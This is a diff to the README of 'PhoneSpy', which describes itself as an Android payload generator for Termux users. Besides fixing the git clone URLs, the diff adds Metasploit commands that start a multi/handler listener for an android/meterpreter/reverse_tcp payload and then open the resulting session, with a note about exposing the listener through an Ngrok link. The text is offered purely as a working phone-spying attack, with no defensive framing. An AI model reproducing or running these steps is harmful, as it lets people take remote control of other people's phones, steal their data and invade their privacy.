@@ -22,7 +22,7 @@ PhoneSpy is a Simple Android Payload Generator Only For Termux Users.
 ```
 apt-get update
 
-git clone https://github.com/ShymonHasan PhoneSpy.git
+git clone https://github.com/ShymonHasan/PhoneSpy.git
 
 cd PhoneSpy
 
@@ -39,7 +39,7 @@ pkg update
 
 pkg install git
 
-git clone https://github.com/ShymonHasan.git
+git clone https://github.com/ShymonHasan/PhoneSpy.git
 
 cd PhoneSpy
 
@@ -47,6 +47,21 @@ chmod +x install.sh
 
 bash install.sh
 ```
+
+## Next Command 
+```
+use exploit/multi/handler
+
+set PAYLOAD android/meterpreter/reverse_tcp
+
+set LHOST (IP)
+
+set LPORT (9944)
+
+exploit -j
+
+sessions -i 1
+
 Note: Use Mobile Data For Ngrok Link
 
 ## Give me the credits if you copy ANY part from this code. Don't be NOOB!!
